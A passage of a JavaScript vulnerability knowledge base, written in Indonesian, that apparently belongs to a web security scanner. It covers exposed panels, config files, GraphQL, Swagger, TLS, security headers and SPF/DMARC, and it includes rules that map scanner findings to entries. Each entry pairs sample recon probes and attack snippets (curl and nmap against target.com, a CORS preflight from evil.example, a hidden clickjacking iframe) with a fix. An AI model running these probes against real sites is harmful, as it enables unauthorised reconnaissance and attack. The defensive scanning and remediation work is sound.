    name: 'CORS Memantulkan Header Otorisasi',
    severity: 'medium',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Server mengizinkan header otorisasi arbitrer via CORS wildcard, melonggarkan batas browser terhadap header sensitif.',
    impact: 'Skrip origin lain lebih mudah mengirim Authorization ke endpoint Anda; kombinasi salah dengan reflected origin bisa mengekspos token.',
    payloads: ['curl -sI -X OPTIONS -H "Origin: https://evil.example" -H "Access-Control-Request-Headers: authorization" https://target.com/api/'],
    vulnerable: 'Access-Control-Allow-Headers: *',
    attack: 'OPTIONS /api/ HTTP/1.1\nAccess-Control-Request-Headers: authorization',
    response: 'HTTP/1.1 204 No Content\nAccess-Control-Allow-Headers: *',
    fix: 'Daftarkan header eksplisit yang diperlukan (Content-Type, dsb) tanpa wildcard.',
    reference: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers',
  }),

  'phpmyadmin-exposed': entry({
    vulnId: 'CXL-036',
    cwe: 'CWE-1236',
    name: 'phpMyAdmin Terjangkau Publik',
    severity: 'medium',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Panel phpMyAdmin dapat diakses dari internet, menjadi target brute-force dan eksploitasi CVE phpMyAdmin lama.',
    impact: 'Bila kredensial bocor/lemah, kontrol database penuh dari browser penyerang.',
    payloads: ['GET /phpmyadmin/', 'GET /pma/', 'GET /adminer.php'],
    vulnerable: 'Alias /phpmyadmin /usr/share/phpmyadmin   # tanpa IP allowlist',
    attack: 'GET /phpmyadmin/ HTTP/1.1',
    response: 'HTTP/1.1 200 OK\n\n<title>phpMyAdmin</title> ... form login',
    fix: 'Batasi via VPN/IP allowlist atau matikan, aktifkan 2FA/auth layer di depan, dan upgrade ke versi terbaru.',
    reference: 'https://docs.phpmyadmin.net/en/latest/setup.html',
  }),

  'wp-user-enum': entry({
    vulnId: 'CXL-037',
    cwe: 'CWE-203',
    name: 'Enumerasi User WordPress Terbuka',
    severity: 'medium',
    category: 'Information Disclosure',
    owasp: 'A01:2021',
    what: 'REST API /wp-json/wp/v2/users memperlihatkan daftar username sah, termasuk admin.',
    impact: 'Username valid membuat brute-force password dan password spraying jauh lebih akurat.',
    payloads: ['GET /wp-json/wp/v2/users', 'GET /?author=1'],
    vulnerable: '# WordPress default: REST users endpoint publik',
    attack: 'curl -s https://target.com/wp-json/wp/v2/users | jq ".[].slug"',
    response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n[{"id":1,"name":"admin","slug":"admin"},...]',
    fix: 'Blokir endpoint users untuk pengunjung anonim (filter rest_endpoints), batasi login attempt, dan aktifkan 2FA.',
    reference: 'https://developer.wordpress.org/rest-api/reference/users/',
  }),

  'actuator-or-config': entry({
    vulnId: 'CXL-038',
    cwe: 'CWE-16',
    name: 'File Konfigurasi Server Terekspos',
    severity: 'medium',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'File konfigurasi (.htaccess, web.config) dapat diunduh, memperlihatkan rule rewrite, proteksi, dan struktur direktori.',
    impact: 'Membantu penyerang memahami kontrol akses dan menemukan path tersembunyi untuk dilewati.',
    payloads: ['GET /.htaccess', 'GET /web.config'],
    vulnerable: 'RewriteRule ^admin - [F]\n# plus kredensial basic auth di web.config lama',
    attack: 'GET /.htaccess HTTP/1.1',
    response: 'HTTP/1.1 200 OK\n\nRewriteEngine On\nRewriteRule ^admin - [F]',
    fix: 'Blokir akses ke file konfigurasi (<Files .htaccess> deny) dan hapus komentar berisi kredensial.',
    reference: 'https://httpd.apache.org/docs/2.4/howto/htaccess.html',
  }),

  'server-status': entry({
    vulnId: 'CXL-039',
    cwe: 'CWE-200',
    name: 'Apache server-status / pprof Terekspos',
    severity: 'medium',
    category: 'Information Disclosure',
    owasp: 'A05:2021',
    what: 'Endpoint monitoring internal (server-status, /debug/vars) terekspos: daftar request aktif, IP klien, URL internal, dan statistik memori/heap.',
    impact: 'URL internal + token di query string bisa bocor; memahami trafik dan infrastruktur lawan.',
    payloads: ['GET /server-status', 'GET /debug/vars'],
    vulnerable: '<Location /server-status>\n  SetHandler server-status\n</Location>   # tanpa Require ip 127.0.0.1',
    attack: 'GET /server-status HTTP/1.1',
    response: 'HTTP/1.1 200 OK\n\nApache Server Status for target.com\nGET /api/v1/users?token=xyz ...',
    fix: 'Batasi ke localhost/IP internal (Require local), atau matikan di produksi.',
    reference: 'https://httpd.apache.org/docs/2.4/mod/mod_status.html',
  }),

  'graphql-open': entry({
    vulnId: 'CXL-040',
    cwe: 'CWE-200',
    name: 'Endpoint GraphQL Terbuka / Playground Publik',
    severity: 'medium',
    category: 'Security Misconfiguration',
    owasp: 'A01:2021',
    what: 'GraphQL endpoint (dan playground/GraphiQL) dapat diakses tanpa auth, memungkinkan introspection dan query berantakan yang menyerap resource.',
    impact: 'Skema internal terekspos, data lintas tipe bisa diambil bila resolver lemah (IDOR via GraphQL), dan DoS dengan query berlapis.',
    payloads: ['POST /graphql {"query":"{__schema{types{name}}}"}', 'GET /graphql/playground'],
    vulnerable: 'app.use("/graphql", graphqlHTTP({ schema }));  // tanpa validation/introspection guard',
    attack: 'curl -s https://target.com/graphql -H "Content-Type: application/json" -d \'{"query":"{__schema{queryType{name}}}"}\'',
    response: 'HTTP/1.1 200 OK\n\n{"data":{"__schema":{"queryType":{"name":"Query"}}}}',
    fix: 'Wajibkan auth, matikan introspection di produksi, terapkan depth limiting & query cost analysis.',
    reference: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_GraphQL',
  }),

  'swagger-exposed': entry({
    vulnId: 'CXL-041',
    cwe: 'CWE-200',
    name: 'Dokumentasi API (Swagger/OpenAPI) Publik',
    severity: 'medium',
    category: 'Information Disclosure',
    owasp: 'A01:2021',
    what: 'swagger.json / Swagger UI terekspos memetakan seluruh endpoint, parameter, dan model data API.',
    impact: 'Cheat sheet lengkap bagi penyerang untuk menguji setiap endpoint, termasuk yang internal/admin.',
    payloads: ['GET /swagger.json', 'GET /swagger/ui/index.html', 'GET /api-docs'],
    vulnerable: 'app.use("/api-docs", swaggerUi.serve, swaggerUi.setup(swaggerDocument));',
    attack: 'curl -s https://target.com/swagger.json | jq ".paths | keys"',
    response: 'HTTP/1.1 200 OK\n\n{"openapi":"3.0.0","paths":{"/admin/users":{...},"/internal/export":{...}}}',
    fix: 'Batasi dokumentasi di produksi (auth atau internal-only) dan pastikan dokumentasi tidak memuat endpoint rahasia.',
    reference: 'https://swagger.io/docs/specification/',
  }),

  'crossdomain-permissive': entry({
    vulnId: 'CXL-042',
    cwe: 'CWE-16',
    name: 'crossdomain.xml Terlalu Permisif',
    severity: 'medium',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Policy crossdomain.xml mengizinkan domain * untuk Flash/Silverlight, membolehkan client lama membaca data lintas domain.',
    impact: 'Data terautentikasi dapat dibaca oleh domain pihak ketiga via plugin lama.',
    payloads: ['GET /crossdomain.xml'],
    vulnerable: '<cross-domain-policy><allow-access-from domain="*"/></cross-domain-policy>',
    attack: 'GET /crossdomain.xml HTTP/1.1',
    response: 'HTTP/1.1 200 OK\n\n<allow-access-from domain="*"/>',
    fix: 'Hapus file bila tak dipakai; bila perlu, daftarkan domain eksplisit.',
    reference: 'https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html',
  }),

  'tls-version': entry({
    vulnId: 'CXL-043',
    cwe: 'CWE-326',
    name: 'Versi TLS Tidak Aman',
    severity: 'medium',
    category: 'Cryptographic Failure',
    owasp: 'A02:2021',
    what: 'Server masih menerima TLS 1.0/1.1 (atau cipher lemah) yang sudah tidak memenuhi standar keamanan modern.',
    impact: 'Kemampuan downgrade attack dan kegagalan compliance (PCI-DSS melarang TLS < 1.2).',
    payloads: ['nmap --script ssl-enum-ciphers -p 443 target.com', 'openssl s_client -tls1 -connect target.com:443'],
    vulnerable: 'SSLProtocol all -SSLv3   # TLSv1.0 masih ikut',
    attack: 'openssl s_client -tls1_1 -connect target.com:443',
    response: 'New, TLSv1.1, Cipher is ECDHE-RSA-AES256-SHA   <-- handshake sukses',
    fix: 'Nonaktifkan TLS < 1.2, gunakan cipher suite modern (TLS 1.3 + AEAD), dan uji dengan SSL Labs.',
    reference: 'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html',
  }),

  'tls-cert': entry({
    vulnId: 'CXL-044',
    cwe: 'CWE-295',
    name: 'Sertifikat TLS Tidak Valid / Mismatch',
    severity: 'medium',
    category: 'Cryptographic Failure',
    owasp: 'A02:2021',
    what: 'Sertifikat tidak cocok dengan hostname, self-signed, atau chain tidak lengkap.',
    impact: 'Peringatan browser, kebiasaan klik-lanjut yang bahaya, dan kegagalan validasi client API.',
    payloads: ['openssl s_client -connect target.com:443 -servername target.com 2>/dev/null | openssl x509 -noout -subject'],
    vulnerable: 'subject=CN = other.example.com   (mismatch)',
    attack: 'curl -vk https://target.com/ 2>&1 | grep -i "SSL certificate"',
    response: '* SSL certificate problem: hostname mismatch',
    fix: 'Pasang sertifikat yang mencakup hostname (SAN), lengkapi intermediate chain, dan otomatiskan renew.',
    reference: 'https://cwe.mitre.org/data/definitions/295.html',
  }),

  // ===================== LOW =====================
  'hsts-missing': entry({
    vulnId: 'CXL-050',
    cwe: 'CWE-319',
    name: 'HSTS Tidak Diatur',
    severity: 'low',
    category: 'Cryptographic Failure',
    owasp: 'A02:2021',
    what: 'Header Strict-Transport-Security tidak ada, sehingga browser tidak dipaksa HTTPS pada kunjungan berikutnya.',
    impact: 'SSL stripping masih mungkin pada hop pertama; cookie http bisa tercetak.',
    payloads: ['curl -sI https://target.com/ | grep -i strict'],
    vulnerable: '(header strict-transport-security absen)',
    attack: 'curl -sI https://target.com/ | grep -i strict-transport',
    response: '(tidak ada baris Strict-Transport-Security)',
    fix: 'Tambahkan: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload (mulai dari max-age kecil bila ragu).',
    reference: 'https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html',
  }),

  'csp-missing': entry({
    vulnId: 'CXL-051',
    cwe: 'CWE-693',
    name: 'Content-Security-Policy Tidak Diatur',
    severity: 'low',
    category: 'Security Misconfiguration',
    owasp: 'A02:2021',
    what: 'Tanpa CSP, browser tidak punya lapisan pembatas bila ada celah XSS: script eksternal/inline bebas dieksekusi.',
    impact: 'XSS yang ditemukan lainnya menjadi jauh lebih fatal (tanpa mitigasi browser-side).',
    payloads: ['curl -sI https://target.com/ | grep -i security-policy'],
    vulnerable: '(header content-security-policy absen)',
    attack: 'curl -sI https://target.com/ | grep -i content-security',
    response: '(tidak ada baris Content-Security-Policy)',
    fix: 'Tambahkan CSP: script-src \u2018self\u2019 dengan nonce/hash untuk script inline yang wajib; uji dulu dengan Content-Security-Policy-Report-Only.',
    reference: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP',
  }),

  'csp-unsafe': entry({
    vulnId: 'CXL-052',
    cwe: 'CWE-79',
    name: 'CSP Lemah (unsafe-inline / wildcard)',
    severity: 'low',
    category: 'Security Misconfiguration',
    owasp: 'A02:2021',
    what: "CSP ada namun memakai 'unsafe-inline' atau script-src * sehingga hampir tidak memberi proteksi XSS.",
    impact: 'Payload XSS inline tetap berjalan; CSP hanya sekadar header.',
    payloads: ["curl -sI https://target.com/ | grep -i content-security"],
    vulnerable: "Content-Security-Policy: default-src * 'unsafe-inline'",
    attack: '(XSS inline tetap dieksekusi tanpa hambatan)',
    response: "Content-Security-Policy: script-src * 'unsafe-inline'",
    fix: 'Hapus unsafe-inline, pakai nonce/hash, dan batasi script-src ke sumber eksplisit.',
    reference: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy',
  }),

  'clickjacking': entry({
    vulnId: 'CXL-053',
    cwe: 'CWE-1021',
    name: 'Proteksi Clickjacking Tidak Ada',
    severity: 'low',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Tidak ada X-Frame-Options maupun CSP frame-ancestors, sehingga halaman bisa di-frame situs lain.',
    impact: 'Clickjacking: aksi sensitif (transfer, ubah setting) dipancing lewat frame tersembunyi.',
    payloads: ['<iframe src="https://target.com/settings"></iframe>'],
    vulnerable: '(header x-frame-options dan CSP frame-ancestors absen)',
    attack: '<iframe src="https://target.com/admin/delete?id=1" style="opacity:0"></iframe>\n<button decoy>Klik hadiah!</button>',
    response: '(halaman berhasil di-frame)',
    fix: 'Tambahkan X-Frame-Options: DENY atau CSP frame-ancestors \u2018self\u2019 pada semua halaman stateful.',
    reference: 'https://owasp.org/www-community/attacks/Clickjacking',
  }),

  'xcto-missing': entry({
    vulnId: 'CXL-054',
    cwe: 'CWE-430',
    name: 'X-Content-Type-Options Tidak Diatur',
    severity: 'info',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Tanpa nosniff, browser bisa menebak tipe konten dan mengeksekusi file yang bukan JS sebagai JS.',
    impact: 'Risiko MIME-sniffing XSS pada file upload / respons dinamis.',
    payloads: ['curl -sI https://target.com/ | grep -i nosniff'],
    vulnerable: '(header x-content-type-options absen)',
    attack: 'GET /uploads/avatar.html (berisi script) diakses langsung',
    response: 'Content-Type: text/plain  <-- browser bisa tetap sniff',
    fix: 'Tambahkan X-Content-Type-Options: nosniff global.',
    reference: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options',
  }),

  'referrer-missing': entry({
    vulnId: 'CXL-055',
    cwe: 'CWE-200',
    name: 'Referrer-Policy Tidak Diatur',
    severity: 'info',
    category: 'Information Disclosure',
    owasp: 'A05:2021',
    what: 'URL penuh (termasuk query/token) bisa terkirim ke situs pihak ketiga lewat header Referer.',
    impact: 'Token di URL bocor ke situs eksternal ketika user mengikuti link keluar.',
    payloads: ['curl -sI https://target.com/ | grep -i referrer'],
    vulnerable: '(header referrer-policy absen)',
    attack: '<a href="https://external.example">keluar</a> -> Referer: https://target.com/page?token=xyz',
    response: '(tidak ada baris Referrer-Policy)',
    fix: 'Tambahkan Referrer-Policy: strict-origin-when-cross-origin (atau no-referrer).',
    reference: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy',
  }),

  'permissions-missing': entry({
    vulnId: 'CXL-056',
    cwe: 'CWE-693',
    name: 'Permissions-Policy Tidak Diatur',
    severity: 'info',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Permissions-Policy tidak diatur sehingga fitur browser berat (kamera, mikrofon, geolocation) tidak dibatasi untuk iframe pihak ketiga.',
    impact: 'Risiko rendah; membatasi API powerful adalah praktik defense-in-depth.',
    payloads: ['curl -sI https://target.com/ | grep -i permissions-policy'],
    vulnerable: '(header permissions-policy absen)',
    attack: '(iframe pihak ketiga bisa meminta kamera/lokasi sesuai izin user)',
    response: '(tidak ada baris Permissions-Policy)',
    fix: 'Tambahkan Permissions-Policy: camera=(), microphone=(), geolocation=() bila tidak dipakai.',
    reference: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy',
  }),

  'server-version': entry({
    vulnId: 'CXL-057',
    cwe: 'CWE-200',
    name: 'Versi Server / Teknologi Terekspos',
    severity: 'low',
    category: 'Information Disclosure',
    owasp: 'A05:2021',
    what: 'Header Server/X-Powered-By memperlihatkan versi web server, framework, atau bahasa.',
    impact: 'Mempermudah pencarian CVE yang cocok dengan versi spesifik.',
    payloads: ['curl -sI https://target.com/ | grep -Ei "server:|x-powered-by"'],
    vulnerable: 'Server: nginx/1.18.0\nX-Powered-By: Express',
    attack: 'curl -sI https://target.com/ | grep -i server',
    response: 'Server: nginx/1.18.0',
    fix: 'Sembunyikan/ubah header (server_tokens off; hapus x-powered-by), patch rutin ke versi stabil terbaru.',
    reference: 'https://owasp.org/www-project-secure-headers/',
  }),

  'email-internal': entry({
    vulnId: 'CXL-058',
    cwe: 'CWE-200',
    name: 'Email Internal Terekspos',
    severity: 'low',
    category: 'Information Disclosure',
    owasp: 'A05:2021',
    what: 'Alamat email karyawan/admin ditemukan di halaman publik (kontak, footer, meta).',
    impact: 'Target phishing/social engineering yang lebih presisi terhadap organisasi.',
    payloads: ['curl -s https://target.com/ | grep -Eo "[a-z0-9._%+-]+@[a-z0-9.-]+"'],
    vulnerable: '<a href="mailto:admin@target.com">Hubungi Admin</a>',
    attack: '(OSINT) kumpulkan email -> phishing terarah',
    response: 'admin@target.com, hr@target.com',
    fix: 'Gunakan form kontak/email generik (info@), pertimbangkan obfuscasi, dan edukasi anti-phishing.',
    reference: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/04-Search_engine_discovery_reconnaissance',
  }),

  'private-ip': entry({
    vulnId: 'CXL-059',
    cwe: 'CWE-200',
    name: 'IP Privat Terekspos di Respons',
    severity: 'low',
    category: 'Information Disclosure',
    owasp: 'A05:2021',
    what: 'Respons berisi alamat IP internal (10.x, 192.168.x, 172.16-31.x) yang memetakan topologi jaringan dalam.',
    impact: 'Membantu pemetaan infrastruktur internal untuk serangan lanjutan (SSRF pivoting).',
    payloads: ['curl -s https://target.com/api/status | grep -E "10\\.|192\\.168\\."'],
    vulnerable: '{"status":"ok","db_host":"10.0.2.15"}',
    attack: 'GET /api/status HTTP/1.1',
    response: '{"status":"ok","db_host":"10.0.2.15"}',
    fix: 'Filter output internal, gunakan nama logis alih-alih IP, dan sembunyikan detail error.',
    reference: 'https://cwe.mitre.org/data/definitions/200.html',
  }),

  'error-5xx': entry({
    vulnId: 'CXL-060',
    cwe: 'CWE-209',
    name: 'Respons Error 5xx / Verbose',
    severity: 'low',
    category: 'Information Disclosure',
    owasp: 'A05:2021',
    what: 'Endpoint menghasilkan error 500 dengan detail yang tidak diperlukan publik.',
    impact: 'Detail error memandu manipulasi input lebih lanjut.',
    payloads: ['GET /api/item?id=abc'],
    vulnerable: 'HTTP/1.1 500 Internal Server Error\n{"error":"TypeError: Cannot read property \'id\' of undefined at /srv/app.js:42"}',
    attack: 'GET /api/item?id=abc HTTP/1.1',
    response: 'HTTP/1.1 500 Internal Server Error ... (detail stack)',
    fix: 'Tangani error dengan halaman generik + logging internal; validasi input.',
    reference: 'https://cwe.mitre.org/data/definitions/209.html',
  }),

  'ports-open': entry({
    vulnId: 'CXL-061',
    cwe: 'CWE-200',
    name: 'Port Layanan Web Terbuka',
    severity: 'info',
    category: 'Recon / Exposure',
    owasp: 'A05:2021',
    what: 'Port web tambahan (8080, 8443, dsb) merespons - sering berisi instance staging/admin yang lupa diproteksi.',
    impact: 'Lingkungan staging biasanya lebih longgar keamanannya daripada produksi.',
    payloads: ['curl -sk https://target.com:8080/', 'nmap -p 80,443,8080,8443 target.com'],
    vulnerable: '# nginx listening 8080 tanpa auth',
    attack: 'GET / HTTP/1.1\nHost: target.com:8080',
    response: 'HTTP/1.1 200 OK  (aplikasi/staging terekspos)',
    fix: 'Tutup port yang tidak perlu, lindungi staging dengan auth/IP allowlist, dan samakan standar keamanan dengan produksi.',
    reference: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/',
  }),

  'header-weak': entry({
    vulnId: 'CXL-062',
    cwe: 'CWE-693',
    name: 'Header Keamanan Lemah/Bermasalah',
    severity: 'info',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Nilai header keamanan tidak sesuai standar (terlalu longgar atau bermakna ganda).',
    impact: 'Mengurangi efek mitigasi header; gabungan header lemah memperluas permukaan serangan.',
    payloads: ['curl -sI https://target.com/'],
    vulnerable: 'X-Frame-Options: ALLOW-FROM https://*   (sintaks deprecated)',
    attack: '(audit header)',
    response: '(header tidak efektif)',
    fix: 'Ikuti OWASP Secure Headers Project untuk nilai yang benar.',
    reference: 'https://owasp.org/www-project-secure-headers/',
  }),

  'robots-intel': entry({
    vulnId: 'CXL-063',
    cwe: 'CWE-200',
    name: 'Intelejen robots.txt / sitemap',
    severity: 'info',
    category: 'Recon',
    owasp: 'A05:2021',
    what: 'robots.txt/sitemap memuat daftar path yang disembunyikan dari crawler - sering berisi panel admin dan area staging.',
    impact: 'Informatif: memberi kandidat path untuk diuji lebih lanjut, bukan kerentanan langsung.',
    payloads: ['GET /robots.txt', 'GET /sitemap.xml'],
    vulnerable: 'User-agent: *\nDisallow: /admin\nDisallow: /backup-2024/',
    attack: 'curl -s https://target.com/robots.txt',
    response: 'Disallow: /admin',
    fix: 'Jangan andalkan robots.txt untuk menyembunyikan area sensitif - gunakan auth.',
    reference: 'https://developers.google.com/search/docs/crawling-indexing/robots/intro',
  }),

  'spf-missing': entry({
    vulnId: 'CXL-064',
    cwe: 'CWE-290',
    name: 'Record SPF Tidak Ada',
    severity: 'low',
    category: 'Email Security',
    owasp: 'A05:2021',
    what: 'Domain punya MX namun tidak ada TXT v=spf1 - server sembarang bisa mengirim email atas nama domain.',
    impact: 'Spoofing email domain Anda untuk phishing klien/partner.',
    payloads: ['dig TXT target.com +short | grep spf'],
    vulnerable: '(TXT v=spf1 tidak ada padahal MX ada)',
    attack: 'sendmail: MAIL FROM:<ceo@target.com> -> diterima tanpa keberatan',
    response: '(SPF check: none)',
    fix: 'Terbitkan SPF (v=spf1 include:_spf.provider.com -all), lalu DMARC p=quarantine/reject.',
    reference: 'https://datatracker.ietf.org/doc/html/rfc7208',
  }),

  'dmarc-missing': entry({
    vulnId: 'CXL-065',
    cwe: 'CWE-290',
    name: 'Record DMARC Tidak Ada',
    severity: 'low',
    category: 'Email Security',
    owasp: 'A05:2021',
    what: 'Tidak ada policy DMARC (_dmarc TXT) sehingga kebijakan penanganan spoofing tidak didefinisikan.',
    impact: 'Receiving server bebas mempercayai email palsu dari domain Anda.',
    payloads: ['dig TXT _dmarc.target.com +short'],
    vulnerable: '(no _dmarc record)',
    attack: '(spoofed email lolos verifikasi kebanyakan mailbox)',
    response: '(DMARC: none)',
    fix: 'Terbitkan DMARC mulai p=none dengan rua laporan, lalu naikkan ke p=quarantine setelah audit SPF/DKIM.',
    reference: 'https://datatracker.ietf.org/doc/html/rfc7489',
  }),

  'recon-info': entry({
    vulnId: 'CXL-066',
    cwe: 'CWE-200',
    name: 'Informasi Recon (Informatif)',
    severity: 'info',
    category: 'Recon',
    owasp: 'A05:2021',
    what: 'Temuan informatif hasil recon yang membantu memetakan permukaan serangan target.',
    impact: 'Bukan kerentanan langsung; berguna untuk perencanaan pengujian lanjutan.',
    payloads: [],
    vulnerable: '',
    attack: '',
    response: '',
    fix: 'Gunakan data ini untuk memprioritaskan pengujian pada area yang lebih sensitif.',
    reference: '',
  }),
};

// ---------------------------------------------------------------------------
// Aturan pencocokan externalId (urutan penting: paling spesifik dulu)
// ---------------------------------------------------------------------------
const RULES = [
  [/^xss:reflected-encoded/, 'xss-encoded'],
  [/^xss:reflected/, 'xss-reflected'],
  [/^sqli:/, 'sql-injection'],
  [/^traversal:/, 'path-traversal'],
  [/^redirect:downgrade/, 'redirect-downgrade'],
  [/^redirect:open/, 'open-redirect'],
  [/^redirect:/, 'recon-info'],
  [/^cors:reflected/, 'cors-reflected'],
  [/^cors:wildcard-credentials/, 'cors-wildcard-creds'],
  [/^cors:wildcard-auth/, 'cors-wildcard-auth'],
  [/^dirlisting:|^page:dirlisting/, 'dirlisting'],
  [/^page:stacktrace:|^info:stacktrace:/, 'stack-trace'],
  [/^page:5xx/, 'error-5xx'],
  [/^page:mixed-content/, 'mixed-content'],
  [/^http:dangerous-methods/, 'http-methods'],
  [/^cookie:flags/, 'cookie-flags'],
  [/^takeover:/, 'subdomain-takeover'],
  [/^malware:/, 'malware-detected'],
  [/^secret:/, 'secret-leak'],
  [/^ports:/, 'ports-open'],
  [/^tls:cert-expired/, 'tls-expired'],
  [/^tls:cert-expiring/, 'tls-cert'],
  [/^tls:weak-version|^tls:version/, 'tls-version'],
  [/^tls:cert/, 'tls-cert'],
  [/^info:server-version|^server:version|^info:poweredby|^server:poweredby|^tech:version-disclosure/, 'server-version'],
  [/^info:emails/, 'email-internal'],
  [/^info:private-ip/, 'private-ip'],
  [/^sec:hsts/, 'hsts-missing'],
  [/^sec:csp-unsafe-inline|^sec:csp-wildcard/, 'csp-unsafe'],
  [/^sec:csp-missing/, 'csp-missing'],
  [/^sec:clickjacking/, 'clickjacking'],
  [/^sec:xcto/, 'xcto-missing'],
  [/^sec:referrer/, 'referrer-missing'],
  [/^sec:permissions/, 'permissions-missing'],
  [/^header:strict-transport/, 'hsts-missing'],
  [/^header:content-security/, 'csp-missing'],
  [/^header:x-frame/, 'clickjacking'],
  [/^header:x-content-type/, 'xcto-missing'],
  [/^header:referrer/, 'referrer-missing'],
  [/^header:permissions/, 'permissions-missing'],
  [/^header:server/, 'server-version'],
  [/^email:spf/, 'spf-missing'],
  [/^email:dmarc/, 'dmarc-missing'],
  [/^recon:|^header:/, 'recon-info'],
];

// Peta path exposed -> entry KB (dicek dengan substring, urutan spesifik dulu)
const EXPOSED_MAP = [
  [/\.aws\/credentials/i, 'aws-creds-exposed'],
  [/\.env/i, 'env-exposed'],
  [/\.git/i, 'git-exposed'],
  [/\.svn/i, 'svn-exposed'],
  [/phpinfo|info\.php/i, 'phpinfo-exposed'],
  [/actuator/i, 'actuator-exposed'],
  [/\bdb\.sql$|database\.sql|dump\.sql/i, 'db-dump-exposed'],
  [/backup\.(zip|tar\.gz|sql)|\.bak$|\.bak\b/i, 'backup-exposed'],
  [/wp-config|config\.php/i, 'backup-exposed'],
  [/phpmyadmin|adminer/i, 'phpmyadmin-exposed'],
  [/wp-json\/wp\/v2\/users/i, 'wp-user-enum'],
  [/xmlrpc\.php/i, 'recon-info'],
  [/swagger/i, 'swagger-exposed'],
  [/graphql/i, 'graphql-open'],
  [/\.htaccess|web\.config/i, 'actuator-or-config'],
  [/crossdomain\.xml/i, 'crossdomain-permissive'],
  [/server-status/i, 'server-status'],
  [/debug\/vars/i, 'server-status'],
  [/\.DS_Store/i, 'recon-info'],
  [/composer\.json|package\.json/i, 'recon-info'],
  [/security\.txt|robots\.txt/i, 'robots-intel'],
  [/\/admin|\/administrator/i, 'recon-info'],
];

function kbEntry(key) {
  return KB[key] || null;
}

function kbList() {
  return Object.keys(KB);
}

/** Resolusi entry KB dari externalId temuan (+opsional evidence untuk detail tambahan). */
function kbFor(externalId, evidence) {
  const id = String(externalId || '').trim();
  if (!id) return null;

  // 1) exposed:{path} -> peta path
  const mExp = /^exposed:(.+)$/i.exec(id);
  if (mExp) {
    const p = mExp[1];
    for (const [re, key] of EXPOSED_MAP) {
      if (re.test(p)) return KB[key];
    }
    return KB['recon-info'];
  }

  // 2) aturan regex lain
  for (const [re, key] of RULES) {
    if (re.test(id)) return _specialize(key, id, evidence);
  }

  // 3) pencarian substring longgar (mis. "nuclei sql-injection-error-based")
  const low = id.toLowerCase();
  for (const key of Object.keys(KB)) {
    const anchor = low.replace(/[^a-z0-9]/g, '');
    if (anchor && key.replace(/[^a-z0-9]/g, '') === anchor) return _specialize(key, id, evidence);
  }
  return null;
}

function _specialize(key, id, evidence) {
  const base = KB[key];
  if (!base) return null;
  let e = base;
  // SQLi: sesuaikan contoh respons dengan DB yang terdeteksi pada evidence
  if (key === 'sql-injection' && evidence) {
    const ev = String(evidence);
    const dbExamples = {
      MySQL: 'Warning: mysqli_query(): You have an error in your SQL syntax; ... near \'\'\' at line 1',
      MariaDB: 'You have an error in your SQL syntax; check the manual... for the right syntax (MariaDB)',
      PostgreSQL: 'PG::SyntaxError: ERROR:  syntax error at or near "\'" LINE 1: SELECT * FROM p WHERE id=\'\'',
      SQLite: 'Warning: SQLite3::query(): near "\'": syntax error (SQLite)',
      'Microsoft SQL Server': "Unclosed quotation mark after the character string '' (Microsoft SQL Server)",
      MSSQL: "Unclosed quotation mark after the character string '' (Microsoft SQL Server)",
      Oracle: 'ORA-01756: quoted string not properly terminated (Oracle)',
    };
    for (const [db, resp] of Object.entries(dbExamples)) {
      if (ev.includes(db)) {
        e = { ...base, name: `SQL Injection (Error-Based) - ${db}`, what: `${base.what} Database yang terdeteksi: ${db}.` };
        break;
      }
    }
  }
  // Takeover: sesuaikan respons contoh dengan layanan yang terdeteksi
  if (key === 'subdomain-takeover') {
    const m = /^takeover:(.+)$/i.exec(String(id));
    if (m) {
      const svc = m[1];
      const sevMap = { 'AWS S3': 'critical' };
      e = { ...base, name: `Potensi Subdomain Takeover - ${svc}`, severity: sevMap[svc] || base.severity };
    }
  }
  // Malware: nama spesifik per tipe
  if (key === 'malware-detected') {
    const m = /^malware:(.+)$/i.exec(String(id));
    if (m) {
      const label = m[1].replace(/[-_]/g, ' ');
      e = { ...base, name: `Indikasi Malware: ${label}` };
    }
  }
  // Secrets: nama spesifik dari sig id
  if (key === 'secret-leak') {
    const m = /^secret:([a-z0-9_-]+):/i.exec(String(id));
    if (m) {
      const label = m[1].replace(/[-_]/g, ' ').toUpperCase();
      e = { ...base, name: `Secret Terekspos: ${label}` };
    }
  }
  return e;
}

/** Pencarian sederhana untuk perintah /vuln <query>. */
function kbSearch(q) {
  const s = String(q || '').toLowerCase().trim();
  if (!s) return [];
  const out = [];
  const sAnchor = s.replace(/[^a-z0-9]/g, '');
  for (const [key, e] of Object.entries(KB)) {
    const hay = `${key} ${e.vulnId} ${e.cwe} ${e.name} ${e.category} ${e.owasp}`.toLowerCase();
    if (hay.includes(s) || (sAnchor && key.replace(/[^a-z0-9]/g, '').includes(sAnchor))) out.push(e);
  }
  return out.slice(0, 8);
}

/** Data enrichment ringkas untuk disisipkan ke evidence JSON temuan. */
function ENRICH(externalId, evidence) {
  const e = kbFor(externalId, evidence);
  if (!e) return null;
